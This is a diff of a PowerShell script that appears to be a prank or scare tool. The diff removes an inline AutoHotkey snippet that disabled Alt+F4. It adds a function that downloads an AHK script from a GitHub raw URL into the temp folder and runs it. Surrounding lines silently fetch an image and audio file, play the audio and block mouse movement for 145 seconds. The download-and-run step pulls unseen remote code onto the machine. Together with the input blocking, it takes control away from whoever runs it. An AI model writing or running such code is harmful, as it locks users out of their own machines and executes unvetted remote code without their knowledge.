@@ -42,39 +42,19 @@ function Stop-AutoHotkeyScript {
     Stop-Process -Name "AutoHotkey" -Force
 }
 
-# Function to simulate blocking Alt + F4 hotkey
-function Simulate-BlockAltF4 {
-    param (
-        [int]$durationInSeconds = 145
-    )
-    
-    $scriptPath = "$env:TEMP\block_alt_f4.ahk"
-    # Create the AutoHotkey script
-    $scriptContent = @"
-#Persistent
-#NoEnv
-SendMode Input
-BlockAltF4() {
-    Hotkey, !F4, BlockAltF4Handler
-    Return
-}
+# Function to download and run AHK file from GitHub
+function DownloadAndRun-AHKFromGitHub {
+    $ahkUrl = "https://raw.githubusercontent.com/BoothUA/RD_Scripts/main/Nothing.ahk"
+    $downloadPath = "$env:TEMP\nothing.ahk"
 
-BlockAltF4Handler() {
-    ; Do nothing, effectively blocking Alt + F4
-    Return
-}
-
-BlockAltF4()
-Return
-"@
-    Set-Content -Path $scriptPath -Value $scriptContent
-    
-    Run-AutoHotkeyScript -scriptPath $scriptPath
-    
-    Start-Sleep -Seconds $durationInSeconds
-    
-    Stop-AutoHotkeyScript
-    Write-Host "Alt + F4 hotkey re-enabled."
+    try {
+        Invoke-WebRequest -Uri $ahkUrl -OutFile $downloadPath -UseBasicParsing
+        Write-Host "AHK script successfully downloaded to $downloadPath"
+        Run-AutoHotkeyScript -scriptPath $downloadPath
+    } catch {
+        Write-Host "Failed to download or run the AHK script." -ForegroundColor Red
+        exit
+    }
 }
 
 # Function to silently download the raw image file from GitHub
@@ -94,8 +74,8 @@ function Download-ImageFromGitHub {
 
 # Function to silently download the raw WAV file from GitHub
 function Download-AudioFromGitHub {
-    $audioUrl = "https://raw.githubusercontent.com/BoothUA/RD_Scripts/a927af074cca9c80540f6769fc159d101c929661/Nothing.wav"
-    $downloadPath = "$env:TEMP\Nothing.wav"
+    $audioUrl = "https://raw.githubusercontent.com/BoothUA/RD_Scripts/main/Nothing.wav"
+    $downloadPath = "$env:TEMP\nothing.wav"
 
     try {
         Invoke-WebRequest -Uri $audioUrl -OutFile $downloadPath -UseBasicParsing
@@ -226,5 +206,5 @@ Play-Audio -audioPath $audioPath
 # Simulate disabling mouse movement for 2 minutes and 25 seconds
 Simulate-BlockMouseMovement -durationInSeconds 145
 
-# Temporarily disable Alt + F4 hotkey for 2 minutes and 25 seconds
-Simulate-BlockAltF4 -durationInSeconds 145
+# Run the AutoHotkey script from GitHub after disabling mouse movement
+DownloadAndRun-AHKFromGitHub
